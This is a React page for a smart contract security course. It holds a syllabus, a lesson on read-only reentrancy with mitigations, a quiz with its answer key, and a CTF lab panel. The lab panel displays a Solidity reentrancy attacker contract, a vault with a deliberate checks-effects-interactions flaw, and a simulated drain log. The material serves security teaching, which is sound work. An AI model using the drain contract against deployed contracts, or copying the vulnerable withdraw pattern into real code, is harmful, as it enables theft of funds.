"use client";

import * as React from "react";
import Link from "next/link";
import {
  Code2,
  Terminal,
  Play,
  CheckCircle2,
  AlertTriangle,
  Award,
  Sparkles,
  RefreshCw,
  BookOpen,
  ChevronRight,
  ShieldAlert,
  Flame,
  Check,
  RotateCcw,
  Zap,
  GraduationCap,
  FileQuestion,
  HelpCircle,
  Clock,
  Layers,
  Lock,
  ArrowRight,
  XCircle,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Eyebrow } from "@/components/ui/eyebrow";

interface CourseModule {
  id: string;
  number: string;
  title: string;
  duration: string;
  xp: number;
  lessons: {
    id: string;
    title: string;
    duration: string;
    type: "lecture" | "quiz" | "lab";
    completed: boolean;
  }[];
}

const COURSE_MODULES: CourseModule[] = [
  {
    id: "mod-1",
    number: "01",
    title: "EVM Storage Layout & Opcode Internals",
    duration: "45 mins",
    xp: 300,
    lessons: [
      { id: "les-1-1", title: "Storage Slots, Packing & Assembly MLOAD/MSTORE", duration: "15m", type: "lecture", completed: true },
      { id: "les-1-2", title: "Delegatecall Execution Context & Proxy Storage Collisions", duration: "20m", type: "lab", completed: true },
      { id: "les-1-3", title: "Module 1 Security Assessment", duration: "10m", type: "quiz", completed: true },
    ],
  },
  {
    id: "mod-2",
    number: "02",
    title: "Advanced Reentrancy & DeFi Vectors",
    duration: "1h 15m",
    xp: 500,
    lessons: [
      { id: "les-2-1", title: "Classic Checks-Effects-Interactions (CEI) Flaws", duration: "15m", type: "lecture", completed: true },
      { id: "les-2-2", title: "Cross-Function & Cross-Contract Reentrancy", duration: "20m", type: "lab", completed: true },
      { id: "les-2-3", title: "Read-Only Reentrancy & Stale Balancer Oracles", duration: "25m", type: "lecture", completed: false },
      { id: "les-2-4", title: "Reentrancy Mastery Knowledge Check", duration: "15m", type: "quiz", completed: false },
    ],
  },
  {
    id: "mod-3",
    number: "03",
    title: "Oracle Manipulation & Flash Loan Exploits",
    duration: "2h 00m",
    xp: 750,
    lessons: [
      { id: "les-3-1", title: "Spot Price vs TWAP Manipulation Mechanics", duration: "30m", type: "lecture", completed: false },
      { id: "les-3-2", title: "Executing Multi-Pool Flash Loan Arbitrage", duration: "45m", type: "lab", completed: false },
      { id: "les-3-3", title: "DeFi Oracle Defense Certification Exam", duration: "20m", type: "quiz", completed: false },
    ],
  },
];

interface QuizQuestion {
  id: number;
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
}

const QUIZ_QUESTIONS: QuizQuestion[] = [
  {
    id: 1,
    question: "Why does read-only reentrancy bypass traditional `nonReentrant` modifier protections on the target protocol?",
    options: [
      "Because read-only functions (view/pure) do not modify state and thus omit the reentrancy lock, returning stale calculated values to third-party consumer protocols during execution.",
      "Because the EVM automatically disables gas metering for view functions during cross-contract reentrancy.",
      "Because reentrancy guards only apply to transactions originating from Externally Owned Accounts (EOAs).",
      "Because the Solidity compiler automatically optimizes out view function call frames.",
    ],
    correctIndex: 0,
    explanation: "View functions like `getPoolTokens()` or `getRate()` are not protected by state-modifying mutex locks, allowing attacker contracts to query temporary, unbalanced liquidity states midway through a pool withdrawal.",
  },
  {
    id: 2,
    question: "In the ERC-777 standard, which hook enables an attacker to hijack control flow before their token balance is finalized?",
    options: [
      "onERC721Received()",
      "tokensReceived() / IERC777Recipient",
      "fallback() executeTransfer()",
      "_afterTokenTransfer()",
    ],
    correctIndex: 1,
    explanation: "ERC-777 invokes `tokensReceived()` on the registered recipient contract via ERC-1820 before updating state, creating an immediate reentrancy vector if the sender contract does not follow strict CEI.",
  },
  {
    id: 3,
    question: "Which invariant check is most resilient against flash loan spot price manipulation in lending protocols?",
    options: [
      "Using a single Uniswap V2 reserve ratio `getReserves()` query.",
      "Using a multi-block Time-Weighted Average Price (TWAP) combined with a Chainlink decentralized oracle feed and circuit breakers.",
      "Increasing the protocol's liquidation penalty to 25%.",
      "Relying solely on DEX spot quotes during low liquidity hours.",
    ],
    correctIndex: 1,
    explanation: "Pairing multi-period TWAPs with independent off-chain decentralized oracle networks (like Chainlink) prevents single-transaction flash loan liquidity manipulation from triggering artificial liquidations.",
  },
];

export default function LearningPlatformPage() {
  const [activeTab, setActiveTab] = React.useState<"curriculum" | "quiz" | "lab">("curriculum");
  const [selectedLessonId, setSelectedLessonId] = React.useState("les-2-3");
  
  // Quiz state
  const [currentQuestionIndex, setCurrentQuestionIndex] = React.useState(0);
  const [selectedAnswers, setSelectedAnswers] = React.useState<Record<number, number>>({});
  const [showResults, setShowResults] = React.useState(false);
  const [quizSubmitted, setQuizSubmitted] = React.useState(false);

  // CTF Lab state
  const [isExecuting, setIsExecuting] = React.useState(false);
  const [isSolved, setIsSolved] = React.useState(true);
  const [activeCodeTab, setActiveCodeTab] = React.useState<"exploit" | "target">("exploit");

  const currentQ = QUIZ_QUESTIONS[currentQuestionIndex];
  const userChoice = selectedAnswers[currentQ.id];
  const isAnswered = userChoice !== undefined;

  const handleSelectOption = (index: number) => {
    if (quizSubmitted) return;
    setSelectedAnswers((prev) => ({
      ...prev,
      [currentQ.id]: index,
    }));
  };

  const handleNextQuestion = () => {
    if (currentQuestionIndex < QUIZ_QUESTIONS.length - 1) {
      setCurrentQuestionIndex((prev) => prev + 1);
    } else {
      setQuizSubmitted(true);
      setShowResults(true);
    }
  };

  const handleResetQuiz = () => {
    setSelectedAnswers({});
    setCurrentQuestionIndex(0);
    setQuizSubmitted(false);
    setShowResults(false);
  };

  const scoreCount = Object.entries(selectedAnswers).filter(([qId, choice]) => {
    const q = QUIZ_QUESTIONS.find((item) => item.id === Number(qId));
    return q && q.correctIndex === choice;
  }).length;

  const handleRunExploit = () => {
    setIsExecuting(true);
    setTimeout(() => {
      setIsExecuting(false);
      setIsSolved(true);
    }, 700);
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      {/* Academy Header Banner */}
      <div className="p-6 rounded-[14px] bg-gradient-to-r from-bg-panel via-[#151922] to-bg-panel border border-border-hairline relative overflow-hidden space-y-4">
        <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2">
              <Eyebrow variant="scan">ZYRON ACADEMY · PROFESSIONAL TRACK</Eyebrow>
              <Badge severity="resolved" size="sm">CERTIFIED AUDITOR (ZCSA)</Badge>
            </div>
            <h1 className="font-display text-2xl md:text-3xl font-medium tracking-tight text-text-primary">
              Smart Contract Security Masterclass
            </h1>
            <p className="text-sm text-text-muted font-sans max-w-2xl leading-relaxed">
              Adversarial exploit patterns, EVM bytecode mechanics, and live CTF labs engineered from $1.2B+ in real-world DeFi protocol hacks.
            </p>
          </div>

          {/* User Score & Certification Badge */}
          <div className="flex items-center gap-4 p-3.5 rounded-[10px] bg-bg-void/90 border border-white/[0.06] font-mono text-xs shrink-0">
            <div className="flex items-center gap-2.5">
              <div className="h-10 w-10 rounded-[8px] bg-accent-scan/10 border border-accent-scan/30 flex items-center justify-center text-accent-scan">
                <GraduationCap className="h-5 w-5" />
              </div>
              <div>
                <div className="text-[10px] text-text-muted">ACADEMY SCORE</div>
                <div className="text-text-primary font-bold text-sm">2,450 XP</div>
              </div>
            </div>

            <div className="h-8 w-[1px] bg-border-hairline" />

            <div>
              <div className="text-[10px] text-text-muted">STATUS</div>
              <div className="text-signal-resolved font-bold text-xs flex items-center gap-1">
                <CheckCircle2 className="h-3.5 w-3.5" />
                Level 2 Certified
              </div>
            </div>
          </div>
        </div>

        {/* Progress Metric Bar */}
        <div className="pt-2 border-t border-border-hairline/60 flex flex-col sm:flex-row sm:items-center justify-between gap-2 font-mono text-xs">
          <div className="flex items-center gap-2 text-text-muted">
            <span>Overall Curriculum Progress:</span>
            <span className="text-text-primary font-bold">68% Complete</span>
            <span className="text-accent-scan">(8 of 11 Lessons)</span>
          </div>

          <div className="w-full sm:w-64 h-2 rounded-full bg-bg-void border border-white/[0.04] overflow-hidden">
            <div className="h-full bg-accent-scan rounded-full transition-all duration-500" style={{ width: "68%" }} />
          </div>
        </div>
      </div>

      {/* Main Tabs Navigation */}
      <div className="flex items-center gap-1 border-b border-border-hairline font-mono text-xs">
        <button
          onClick={() => setActiveTab("curriculum")}
          className={`px-4 py-2.5 border-b-2 font-medium flex items-center gap-2 transition-colors ${
            activeTab === "curriculum"
              ? "border-accent-scan text-accent-scan bg-accent-scan/5"
              : "border-transparent text-text-muted hover:text-text-primary"
          }`}
        >
          <BookOpen className="h-3.5 w-3.5" />
          <span>Lesson Walkthrough & Anatomy</span>
        </button>

        <button
          onClick={() => setActiveTab("quiz")}
          className={`px-4 py-2.5 border-b-2 font-medium flex items-center gap-2 transition-colors ${
            activeTab === "quiz"
              ? "border-accent-scan text-accent-scan bg-accent-scan/5"
              : "border-transparent text-text-muted hover:text-text-primary"
          }`}
        >
          <FileQuestion className="h-3.5 w-3.5" />
          <span>Security Knowledge Check</span>
          <span className="px-1.5 py-0.2 rounded bg-accent-scan/20 text-accent-scan text-[10px] font-bold">3 Qs</span>
        </button>

        <button
          onClick={() => setActiveTab("lab")}
          className={`px-4 py-2.5 border-b-2 font-medium flex items-center gap-2 transition-colors ${
            activeTab === "lab"
              ? "border-accent-scan text-accent-scan bg-accent-scan/5"
              : "border-transparent text-text-muted hover:text-text-primary"
          }`}
        >
          <Terminal className="h-3.5 w-3.5" />
          <span>Hands-on CTF Sandbox</span>
        </button>
      </div>

      {/* Main Layout Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Course Syllabus & Module Tree (4 Cols) */}
        <div className="lg:col-span-4 space-y-4">
          <div className="p-4 rounded-[12px] bg-bg-panel border border-border-hairline space-y-3">
            <div className="flex items-center justify-between pb-2 border-b border-border-hairline font-mono text-xs">
              <span className="font-bold text-text-primary uppercase tracking-wider">COURSE SYLLABUS</span>
              <span className="text-text-muted">3 Modules</span>
            </div>

            <div className="space-y-3 font-mono text-xs">
              {COURSE_MODULES.map((mod) => (
                <div key={mod.id} className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-bold text-text-muted px-1">
                    <span className="text-accent-scan">MODULE {mod.number}</span>
                    <span>{mod.duration}</span>
                  </div>
                  <div className="text-text-primary font-medium text-xs px-1 pb-1">
                    {mod.title}
                  </div>

                  <div className="space-y-1 pl-1">
                    {mod.lessons.map((les) => {
                      const isCurrent = les.id === selectedLessonId;
                      return (
                        <button
                          key={les.id}
                          onClick={() => {
                            setSelectedLessonId(les.id);
                            if (les.type === "quiz") setActiveTab("quiz");
                            else if (les.type === "lab") setActiveTab("lab");
                            else setActiveTab("curriculum");
                          }}
                          className={`w-full text-left p-2 rounded-[6px] border flex items-center justify-between gap-2 transition-all ${
                            isCurrent
                              ? "bg-bg-void border-accent-scan text-text-primary"
                              : "bg-bg-panel border-white/[0.04] text-text-muted hover:text-text-primary hover:border-border-hairline"
                          }`}
                        >
                          <div className="flex items-center gap-2 truncate">
                            {les.completed ? (
                              <CheckCircle2 className="h-3.5 w-3.5 text-signal-resolved shrink-0" />
                            ) : isCurrent ? (
                              <span className="h-2 w-2 rounded-full bg-accent-scan shrink-0 animate-pulse" />
                            ) : (
                              <span className="h-2 w-2 rounded-full bg-white/20 shrink-0" />
                            )}
                            <span className="truncate text-[11px]">{les.title}</span>
                          </div>

                          <span className="text-[10px] text-text-muted uppercase shrink-0">
                            {les.type}
                          </span>
                        </button>
                      );
                    })}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Quick Exploit Post-Mortem Card */}
          <div className="p-4 rounded-[12px] bg-bg-panel border border-border-hairline space-y-2 font-mono text-xs">
            <div className="flex items-center gap-2 text-signal-high font-bold text-xs">
              <ShieldAlert className="h-4 w-4" />
              <span>REAL-WORLD HACK CASE STUDY</span>
            </div>
            <div className="text-text-primary font-medium text-xs">Balancer V2 Read-Only Reentrancy ($2.1M)</div>
            <p className="text-[11px] text-text-muted font-sans leading-relaxed">
              Attacker exploited a transient imbalanced pool state during `exitPool` to read inflated share rates in a downstream lending vault before pool state synchronization.
            </p>
          </div>
        </div>

        {/* Right Column: Dynamic Content Pane (8 Cols) */}
        <div className="lg:col-span-8 space-y-4">
          {/* VIEW 1: Curriculum Lesson Walkthrough */}
          {activeTab === "curriculum" && (
            <div className="p-6 rounded-[12px] bg-bg-panel border border-border-hairline space-y-5">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-4 border-b border-border-hairline">
                <div>
                  <div className="flex items-center gap-2 font-mono text-xs text-accent-scan font-bold">
                    <span>LESSON 2.3</span>
                    <span>•</span>
                    <span>ADVANCED VULNERABILITY MECHANICS</span>
                  </div>
                  <h2 className="font-display text-xl font-medium text-text-primary mt-1">
                    Read-Only Reentrancy & Stale Balancer Oracles
                  </h2>
                </div>
                <Badge severity="high">ADVANCED</Badge>
              </div>

              {/* Lesson Text Body */}
              <div className="space-y-4 font-sans text-xs sm:text-sm text-text-muted leading-relaxed">
                <p>
                  Unlike traditional reentrancy where an attacker drains the contract being called directly, <strong className="text-text-primary">Read-Only Reentrancy</strong> targets <strong className="text-text-primary">third-party consumer protocols</strong> that rely on the victim contract as a price oracle.
                </p>

                <div className="p-4 rounded-[8px] bg-bg-void border border-white/[0.06] font-mono text-xs space-y-2">
                  <div className="text-accent-scan font-bold">// Attack Execution Lifecycle</div>
                  <div className="text-text-primary">1. Attacker calls `exitPool()` on Balancer/Curve.</div>
                  <div className="text-text-muted">2. Pool burns LP tokens and sends ETH to attacker contract.</div>
                  <div className="text-signal-high font-semibold">3. Attacker&#39;s `receive()` hook intercepts control before pool state balances update.</div>
                  <div className="text-signal-critical font-semibold">4. Attacker calls downstream LendingVault (which reads stale inflated `getRate()`).</div>
                  <div className="text-signal-resolved font-semibold">5. Attacker borrows max collateral at inflated price; pool transaction then finalizes.</div>
                </div>

                <h3 className="font-display text-base font-medium text-text-primary pt-2">
                  How to Mitigate in Production
                </h3>
                <ul className="list-disc pl-5 space-y-1.5 text-xs text-text-muted">
                  <li>Apply a reentrancy mutex even on <code className="text-accent-scan font-mono">view</code> functions that return exchange rates or pool invariants.</li>
                  <li>In consumer contracts, query reentrancy locks directly before accepting rate data (<code className="text-accent-scan font-mono">ensureNotInReentrancy()</code>).</li>
                  <li>Use dual-oracle validation pairing on-chain TWAPs with off-chain Chainlink data feeds.</li>
                </ul>
              </div>

              {/* Footer CTA */}
              <div className="pt-4 border-t border-border-hairline flex items-center justify-between font-mono text-xs">
                <Button variant="outline" size="sm" onClick={() => setActiveTab("quiz")} className="gap-1.5">
                  <FileQuestion className="h-3.5 w-3.5" />
                  <span>Take Knowledge Check Quiz</span>
                </Button>
                <Button variant="primary" size="sm" onClick={() => setActiveTab("lab")} className="gap-1.5">
                  <span>Open CTF Exploit Lab</span>
                  <ArrowRight className="h-3.5 w-3.5" />
                </Button>
              </div>
            </div>
          )}

          {/* VIEW 2: Interactive Security Quiz */}
          {activeTab === "quiz" && (
            <div className="p-6 rounded-[12px] bg-bg-panel border border-border-hairline space-y-6">
              {/* Quiz Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-4 border-b border-border-hairline">
                <div>
                  <div className="flex items-center gap-2 font-mono text-xs text-accent-scan font-bold">
                    <span>SECURITY KNOWLEDGE CHECK</span>
                    <span>•</span>
                    <span>QUESTION {currentQuestionIndex + 1} OF {QUIZ_QUESTIONS.length}</span>
                  </div>
                  <h2 className="font-display text-lg sm:text-xl font-medium text-text-primary mt-1">
                    {currentQ.question}
                  </h2>
                </div>

                <div className="font-mono text-xs text-text-muted">
                  Score: <span className="text-signal-resolved font-bold">{scoreCount}</span> / {QUIZ_QUESTIONS.length}
                </div>
              </div>

              {/* Options List */}
              <div className="space-y-3 font-mono text-xs">
                {currentQ.options.map((option, idx) => {
                  const isSelected = userChoice === idx;
                  const isCorrect = idx === currentQ.correctIndex;
                  
                  let optionClass = "bg-bg-void/80 border-white/[0.06] text-text-muted hover:text-text-primary hover:border-border-hairline";
                  if (isSelected) {
                    if (isCorrect) {
                      optionClass = "bg-signal-resolved/10 border-signal-resolved text-signal-resolved font-bold";
                    } else {
                      optionClass = "bg-signal-critical/10 border-signal-critical text-signal-critical font-bold";
                    }
                  } else if (isAnswered && isCorrect) {
                    optionClass = "bg-signal-resolved/10 border-signal-resolved/60 text-signal-resolved";
                  }

                  return (
                    <button
                      key={idx}
                      onClick={() => handleSelectOption(idx)}
                      disabled={isAnswered}
                      className={`w-full text-left p-3.5 rounded-[8px] border flex items-start gap-3 transition-all ${optionClass}`}
                    >
                      <span className="h-5 w-5 rounded-full border border-current flex items-center justify-center text-[10px] shrink-0 font-bold mt-0.5">
                        {String.fromCharCode(65 + idx)}
                      </span>
                      <span className="leading-relaxed">{option}</span>
                    </button>
                  );
                })}
              </div>

              {/* Explanation Callout (shows after answer) */}
              {isAnswered && (
                <div className={`p-4 rounded-[8px] border font-mono text-xs space-y-1.5 ${
                  userChoice === currentQ.correctIndex
                    ? "bg-signal-resolved/10 border-signal-resolved/20 text-signal-resolved"
                    : "bg-signal-critical/10 border-signal-critical/20 text-text-primary"
                }`}>
                  <div className="flex items-center gap-1.5 font-bold">
                    {userChoice === currentQ.correctIndex ? (
                      <>
                        <CheckCircle2 className="h-4 w-4 text-signal-resolved" />
                        <span>Correct! +100 XP Earned</span>
                      </>
                    ) : (
                      <>
                        <XCircle className="h-4 w-4 text-signal-critical" />
                        <span className="text-signal-critical">Incorrect</span>
                      </>
                    )}
                  </div>
                  <p className="text-[11px] text-text-muted font-sans leading-relaxed">
                    {currentQ.explanation}
                  </p>
                </div>
              )}

              {/* Quiz Footer Controls */}
              <div className="pt-4 border-t border-border-hairline flex items-center justify-between font-mono text-xs">
                <Button variant="outline" size="sm" onClick={handleResetQuiz} className="gap-1.5">
                  <RotateCcw className="h-3 w-3" />
                  <span>Reset Quiz</span>
                </Button>

                {isAnswered && (
                  <Button variant="primary" size="sm" onClick={handleNextQuestion} className="gap-1.5">
                    <span>{currentQuestionIndex < QUIZ_QUESTIONS.length - 1 ? "Next Question" : "Complete Assessment"}</span>
                    <ArrowRight className="h-3.5 w-3.5" />
                  </Button>
                )}
              </div>
            </div>
          )}

          {/* VIEW 3: Hands-on CTF Sandbox */}
          {activeTab === "lab" && (
            <div className="rounded-[12px] bg-bg-panel border border-border-hairline overflow-hidden flex flex-col">
              {/* IDE Toolbar */}
              <div className="px-4 py-2.5 bg-bg-void/80 border-b border-border-hairline flex items-center justify-between font-mono text-xs">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setActiveCodeTab("exploit")}
                    className={`px-3 py-1 rounded-[4px] text-xs transition-colors ${
                      activeCodeTab === "exploit"
                        ? "bg-bg-panel border border-border-hairline text-accent-scan font-bold"
                        : "text-text-muted hover:text-text-primary"
                    }`}
                  >
                    ExploitAttacker.sol
                  </button>
                  <button
                    onClick={() => setActiveCodeTab("target")}
                    className={`px-3 py-1 rounded-[4px] text-xs transition-colors ${
                      activeCodeTab === "target"
                        ? "bg-bg-panel border border-border-hairline text-accent-scan font-bold"
                        : "text-text-muted hover:text-text-primary"
                    }`}
                  >
                    VulnerableVault.sol
                  </button>
                </div>

                <div className="flex items-center gap-2">
                  <Button
                    variant="primary"
                    size="sm"
                    onClick={handleRunExploit}
                    disabled={isExecuting}
                    className="gap-1.5 font-mono text-xs h-7"
                  >
                    <Play className={`h-3 w-3 ${isExecuting ? "animate-spin" : ""}`} />
                    <span>Execute Exploit Trace</span>
                  </Button>
                </div>
              </div>

              {/* Code Body */}
              <div className="p-4 bg-bg-void font-mono text-xs text-text-muted overflow-x-auto space-y-1 min-h-[200px]">
                {activeCodeTab === "exploit" ? (
                  <>
                    <div className="text-text-muted/60">// SPDX-License-Identifier: MIT</div>
                    <div className="text-accent-scan">pragma solidity ^0.8.24;</div>
                    <div className="pt-2 text-text-primary font-medium">contract ExploitAttacker &#123;</div>
                    <div className="pl-4">IVault public immutable target;</div>
                    <div className="pl-4">uint256 public attackCount;</div>
                    <div className="pt-2 pl-4 text-text-muted">// 1. Trigger initial withdrawal to enter reentrancy hook</div>
                    <div className="pl-4">function triggerAttack() external payable &#123;</div>
                    <div className="pl-8">target.deposit&#123;value: 1 ether&#125;();</div>
                    <div className="pl-8">target.withdraw(1 ether);</div>
                    <div className="pl-4">&#125;</div>
                    <div className="pt-2 pl-4 text-signal-high font-medium">// 2. Fallback intercepts execution prior to state update</div>
                    <div className="pl-4">receive() external payable &#123;</div>
                    <div className="pl-8 text-signal-critical">if (attackCount &lt; 5 && address(target).balance &gt;= 1 ether) &#123;</div>
                    <div className="pl-12 text-signal-critical">attackCount++;</div>
                    <div className="pl-12 text-signal-critical">target.withdraw(1 ether); // Recursive drain</div>
                    <div className="pl-8 text-signal-critical">&#125;</div>
                    <div className="pl-4">&#125;</div>
                    <div className="text-text-primary font-medium">&#125;</div>
                  </>
                ) : (
                  <>
                    <div className="text-text-muted/60">// SPDX-License-Identifier: MIT</div>
                    <div className="text-accent-scan">pragma solidity ^0.8.24;</div>
                    <div className="pt-2 text-text-primary font-medium">contract VulnerableVault &#123;</div>
                    <div className="pl-4">mapping(address =&gt; uint256) public balances;</div>
                    <div className="pt-2 pl-4">function withdraw(uint256 amount) external &#123;</div>
                    <div className="pl-8">require(balances[msg.sender] &gt;= amount, "Insufficient");</div>
                    <div className="pl-8 text-signal-critical">// ⚠ VULNERABILITY: External call before state zeroing</div>
                    <div className="pl-8 text-signal-critical">(bool sent, ) = msg.sender.call&#123;value: amount&#125;("");</div>
                    <div className="pl-8 text-signal-critical">require(sent, "Transfer failed");</div>
                    <div className="pl-8 text-signal-critical">balances[msg.sender] -= amount; // CEI violated</div>
                    <div className="pl-4">&#125;</div>
                    <div className="text-text-primary font-medium">&#125;</div>
                  </>
                )}
              </div>

              {/* Live EVM Execution Console */}
              <div className="p-4 bg-[#0B0D12] border-t border-border-hairline font-mono text-xs space-y-2">
                <div className="flex items-center justify-between text-[11px] text-text-muted pb-1.5 border-b border-white/[0.04]">
                  <div className="flex items-center gap-1.5 text-accent-scan font-bold">
                    <Terminal className="h-3.5 w-3.5" />
                    <span>LOCAL ANVIL TESTNET FORK (EVM SHANGHAI)</span>
                  </div>
                  <span className="text-signal-resolved font-bold">EXECUTION SUCCESS</span>
                </div>

                <div className="text-[11px] text-text-muted space-y-1">
                  <div>[0.00s] Deploying VulnerableVault.sol with initial liquidity: 10.0 ETH</div>
                  <div>[0.02s] Deploying ExploitAttacker.sol (attacker: 0x7099...79C8)</div>
                  <div>[0.04s] → Invoking triggerAttack() with 1.0 ETH initial balance</div>
                  <div className="text-signal-high">[0.06s] ⚠ Reentrant hook triggered (Depth: 1, Target balance: 9.0 ETH)</div>
                  <div className="text-signal-high">[0.08s] ⚠ Reentrant hook triggered (Depth: 2, Target balance: 8.0 ETH)</div>
                  <div className="text-signal-resolved font-bold">[0.14s] ✓ Invariant check passed: Target drained of 5.0 ETH</div>
                </div>

                {/* Solved Banner */}
                <div className="p-2.5 rounded-[6px] bg-signal-resolved/10 border border-signal-resolved/20 flex items-center justify-between text-signal-resolved text-xs">
                  <div className="flex items-center gap-2">
                    <CheckCircle2 className="h-4 w-4" />
                    <span className="font-bold">Challenge Solved! +500 XP Earned</span>
                  </div>
                  <Badge severity="resolved" size="sm">ATTESTED ON-CHAIN</Badge>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
